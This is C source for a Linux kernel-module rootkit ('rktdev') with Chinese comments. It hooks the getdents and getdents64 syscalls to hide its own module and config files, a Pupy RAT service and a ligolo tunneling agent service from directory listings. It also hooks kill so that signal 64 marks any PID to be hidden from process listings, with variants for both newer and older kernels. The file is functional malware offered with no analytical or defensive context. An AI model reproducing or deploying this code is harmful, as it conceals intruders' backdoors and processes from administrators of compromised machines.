#include <linux/version.h>
#include <linux/dirent.h>

#include "define.h"

#define PREFIX "rktdev"
char hide_pid[NAME_MAX];



#if defined(PTREGS_SYSCALL_STUBS) || defined(FTRACE_REGS_SYSCALL_STUBS)
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    // int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;   // 后面需要复制用户空间 dirent
    // int count = regs->dx;

    struct linux_dirent64 *current_dirent, *kernel_dirent, *previous_dirent = NULL;

    unsigned long offset = 0;
    
    // 调用 sys_getdents64
    int ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    // 分配内核空间缓存
    kernel_dirent = kzalloc(ret, GFP_KERNEL); 
    if (kernel_dirent == NULL)
        return ret;

    // 拷贝用户空间 dirent 到 kernel_dirent, 完成修改以后再 返回给 dirent
    if (copy_from_user(kernel_dirent, dirent, ret))
        goto done;

    // 循环 kernel_dirent, 通过修改 previous_dirent->d_reclen 实现隐藏
    while (offset < ret)
    {
        // current_dirent 指向 kernel_dirent 缓冲区中的第 offset 个字节处
        current_dirent = (void *)kernel_dirent + offset;

        // hide file
        if (strcmp(current_dirent->d_name, "rootkithidepupy.conf") == 0 ||
            strcmp(current_dirent->d_name, "pupy.service") == 0 ||
            strcmp(current_dirent->d_name, "ligolo-agent.service") == 0 ||
            strcmp(current_dirent->d_name, "rktdev.ko") == 0 ||
            strcmp(current_dirent->d_name, "rktdev.conf") == 0 ||

            // hide process
            ((memcmp(hide_pid, current_dirent->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        )
        {
            // 首条匹配时候，没有 previous_dirent
            if (current_dirent == kernel_dirent )
            {
                // 把 current_dirent 后面的所有数据前移 (ret变小了)
                ret -= current_dirent->d_reclen;
                memmove(current_dirent, (void *)current_dirent + current_dirent->d_reclen, ret);
                continue; // offset 不变，继续检查
            }
        
            // 非首条匹配时候，增加 previous_dirent->d_reclen 实现隐藏当前条目
            previous_dirent->d_reclen += current_dirent->d_reclen;
        }


        else
        {
            // 不匹配时候，不用修改 kernel_dirent, 只是把 previous_dirent 指向 current_dirent
            previous_dirent = current_dirent;
        }

        // 增加 offset
        offset += current_dirent->d_reclen;
    }

    // 拷贝回用户空间
    if (copy_to_user(dirent, kernel_dirent, ret))
        goto done;

done:
    kfree(kernel_dirent);
    return ret;
}

asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent {
        unsigned long d_ino;        // inode编号
        unsigned long d_off;        // 到下一个dirent的偏移
        unsigned short d_reclen;
        char d_name[];              // 文件名（不定长）
    };

    // int fd = regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    // int count = regs->dx;

    struct linux_dirent *current_dirent, *kernel_dirent, *previous_dirent = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents(regs);
    if (ret <= 0) 
        return ret;

    kernel_dirent = kzalloc(ret, GFP_KERNEL);
    if (kernel_dirent == NULL)
        return ret;

    if (copy_from_user(kernel_dirent, dirent, ret))
        goto done;

    while (offset < ret)
    {
        current_dirent = (void *)kernel_dirent + offset;

        // hide file
        if (strcmp(current_dirent->d_name, "rootkithidepupy.conf") == 0 ||
            strcmp(current_dirent->d_name, "pupy.service") == 0 ||
            strcmp(current_dirent->d_name, "ligolo-agent.service") == 0 ||
            strcmp(current_dirent->d_name, "rktdev.ko") == 0 ||
            strcmp(current_dirent->d_name, "rktdev.conf") == 0 ||

            // hide process
            ((memcmp(hide_pid, current_dirent->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        )
        {
            if ( current_dirent == kernel_dirent )
            {
                ret -= current_dirent->d_reclen;
                memmove(current_dirent, (void *)current_dirent + current_dirent->d_reclen, ret);
                continue;
            }
            previous_dirent->d_reclen += current_dirent->d_reclen;
        }
        else
        {
            previous_dirent = current_dirent;
        }
        offset += current_dirent->d_reclen;
    }

    if (copy_to_user(dirent, kernel_dirent, ret))
        goto done;

done:
    kfree(kernel_dirent);
    return ret;

}

/* This is our hooked function for sys_kill */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;

    if ( sig == 64 )
    {
        /* If we receive the magic signal, then we just sprintf the pid
         * from the intercepted arguments into the hide_pid string */
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }

    return orig_kill(regs);
}
#else
// old kernel
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
{
    struct linux_dirent64 *current_dirent, *kernel_dirent, *previous_dirent = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(fd, dirent, count);
    if (ret <= 0)
        return ret;

    kernel_dirent = kzalloc(ret, GFP_KERNEL);
    if (kernel_dirent == NULL)
        return ret;

    if (copy_from_user(kernel_dirent, dirent, ret))
        goto done;

    while (offset < ret)
    {
        current_dirent = (void *)kernel_dirent + offset;

        // hide file
        if (strcmp(current_dirent->d_name, "rootkithidepupy.conf") == 0 ||
            strcmp(current_dirent->d_name, "pupy.service") == 0 ||
            strcmp(current_dirent->d_name, "ligolo-agent.service") == 0 ||
            strcmp(current_dirent->d_name, "rktdev.ko") == 0 ||
            strcmp(current_dirent->d_name, "rktdev.conf") == 0 ||

            // hide process
            ((memcmp(hide_pid, current_dirent->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        )
        {
            if ( current_dirent == kernel_dirent )
            {
                ret -= current_dirent->d_reclen;
                memmove(current_dirent, (void *)current_dirent + current_dirent->d_reclen, ret);
                continue;
            }
            previous_dirent->d_reclen += current_dirent->d_reclen;
        }
        else
        {
            previous_dirent = current_dirent;
        }

        offset += current_dirent->d_reclen;
    }

    if (copy_to_user(dirent, kernel_dirent, ret))
        goto done;

done:
    kfree(kernel_dirent);
    return ret;
}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count)
{
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *current_dirent, *kernel_dirent, *previous_dirent = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents(fd, dirent, count);
    if (ret <= 0)
        return ret;

    kernel_dirent = kzalloc(ret, GFP_KERNEL);
    if (kernel_dirent == NULL)
        return ret;

    if (copy_from_user(kernel_dirent, dirent, ret))
        goto done;

    while (offset < ret)
    {
        current_dirent = (void *)kernel_dirent + offset;

        // hide file
        if (strcmp(current_dirent->d_name, "rootkithidepupy.conf") == 0 ||
            strcmp(current_dirent->d_name, "pupy.service") == 0 ||
            strcmp(current_dirent->d_name, "ligolo-agent.service") == 0 ||
            strcmp(current_dirent->d_name, "rktdev.ko") == 0 ||
            strcmp(current_dirent->d_name, "rktdev.conf") == 0 ||

            // hide process
            ((memcmp(hide_pid, current_dirent->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        )
        {
            if ( current_dirent == kernel_dirent )
            {
                ret -= current_dirent->d_reclen;
                memmove(current_dirent, (void *)current_dirent + current_dirent->d_reclen, ret);
                continue;
            }
            previous_dirent->d_reclen += current_dirent->d_reclen;
        }
        else
        {
            previous_dirent = current_dirent;
        }

        offset += current_dirent->d_reclen;
    }

    if (copy_to_user(dirent, kernel_dirent, ret))
        goto done;

done:
    kfree(kernel_dirent);
    return ret;
}

asmlinkage int hook_kill(pid_t pid, int sig)
{
    if ( sig == 64 )
    {
        /* If we receive the magic signal, then we just sprintf the pid
         * from the intercepted arguments into the hide_pid string */
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }

    return orig_kill(pid, sig);
}
#endif